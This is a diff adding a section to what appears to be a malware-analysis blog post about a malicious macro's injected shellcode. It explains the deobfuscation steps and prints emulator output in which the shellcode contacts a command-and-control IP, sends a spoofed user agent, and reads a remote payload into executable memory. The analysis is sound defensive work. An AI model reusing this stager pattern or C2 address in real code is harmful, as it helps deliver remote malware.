@@ -229,6 +229,42 @@ End Sub
 
 ```
 
+Immediately noticeable are the APIs associated with injection - VirtualAlloc, WriteProcessMemory and CreateProcessA. We also notice an array of decimals, which is assumed to be Shellcode given the context and its size.
+
+We can take this array and clean it up by removing all instances of underscores.
+
+Next, we need to fix the negative values, since these are bytes with a maximum value of 256, we want to replace (-4) with the value of (256 - 4) and so on, which can be achieved by using the following CyberChef recipe:
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/aefc6035-f932-4e93-bf49-e4259ee8e0ea)
+
+This shellcode has plaintext references to a UserAgent and the C2 address:
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b11b6a17-f5b0-4a4e-8701-b0248c622504)
+
+Running the shellcode through Speakeasy, we can gain further context:
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/cc074c00-a537-4c0e-83ba-3fe9af230b31)
+
+```
+* exec: shellcode
+0x10a2: 'kernel32.LoadLibraryA("wininet")' -> 0x7bc00000
+0x10b0: 'wininet.InternetOpenA(0x0, 0x0, 0x0, 0x0, 0x0)' -> 0x20
+0x10cc: 'wininet.InternetConnectA(0x20, "47.98.51.47", 0xea5b, 0x0, 0x0, 0x3, 0x0, 0x0)' -> 0x24
+0x10e4: 'wininet.HttpOpenRequestA(0x24, 0x0, "/GdaP", 0x0, 0x0, 0x0, "INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD", 0x0)' -> 0x28
+0x10f8: 'wininet.HttpSendRequestA(0x28, "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.4; .NET4.0C)\r\\n", 0xffffffff, 0x0, 0x0)' -> 0x1
+0x111a: 'user32.GetDesktopWindow()' -> 0x198
+0x1129: 'wininet.InternetErrorDlg(0x198, 0x28, 0x111a, 0x7, 0x0)' -> None
+0x12de: 'kernel32.VirtualAlloc(0x0, 0x400000, 0x1000, "PAGE_EXECUTE_READWRITE")' -> 0x450000
+0x12f9: 'wininet.InternetReadFile(0x28, 0x450000, 0x2000, 0x1203fd4)' -> 0x1
+0x12f9: 'wininet.InternetReadFile(0x28, 0x451000, 0x2000, 0x1203fd4)' -> 0x1
+0x450012: Unhandled interrupt: intnum=0x3
+0x450012: shellcode: Caught error: unhandled_interrupt
+* Finished emulating
+```
+
+
+
+
 
 
 
